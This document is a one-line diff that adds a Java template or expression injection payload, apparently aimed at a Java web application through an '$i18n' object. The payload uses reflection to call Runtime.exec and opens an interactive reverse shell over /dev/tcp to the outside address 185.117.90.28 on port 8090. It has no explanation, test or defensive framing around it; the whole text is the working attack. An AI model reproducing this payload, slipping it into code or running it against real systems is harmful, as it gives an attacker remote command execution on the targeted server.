@@ -1,0 +1,1 @@
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('/bin/sh -i >& /dev/tcp/185.117.90.28/8090 0>&1').waitFor()
